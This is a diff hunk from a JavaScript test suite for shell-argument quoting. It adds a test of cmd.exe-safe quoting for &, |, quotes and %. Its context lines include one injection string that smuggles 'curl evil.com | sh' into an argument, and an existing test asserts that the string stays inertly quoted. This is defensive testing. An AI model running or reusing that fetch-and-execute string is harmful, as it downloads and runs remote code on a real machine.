@@ -117,3 +117,16 @@ test('full simulated schedule command is safe under a malicious frontmatter', ()
   // Argv tokens survive as single-quoted strings.
   assert.ok(cmd.includes(`'x"; curl evil.com | sh; echo "'`), `expected quoted model arg in: ${cmd}`);
 });
+
+test('quoteArgForShell produces cmd.exe-safe quoting (issue #76)', () => {
+  // Wrap in double quotes; inside quotes cmd already treats & | < > literally, so
+  // there must be NO stray ^ (the old code produced "a^&b").
+  assert.equal(quoteArgForShell('cmd.exe', 'a&b'), '"a&b"');
+  assert.equal(quoteArgForShell('C:\\Windows\\System32\\cmd.exe', 'a|b<c>d'), '"a|b<c>d"');
+  // Embedded quotes are doubled ("") — the cmd in-quote escape — not backslashed.
+  assert.equal(quoteArgForShell('cmd.exe', 'say "hi"'), '"say ""hi"""');
+  assert.ok(!quoteArgForShell('cmd.exe', 'x"').includes('\\"'), 'must not use \\" (not a cmd escape)');
+  // We never corrupt % (no bogus %% doubling). cmd's own %VAR% expansion inside
+  // quotes is a documented limitation of this fallback path, not our mangling.
+  assert.equal(quoteArgForShell('cmd.exe', '%PATH%'), '"%PATH%"');
+});
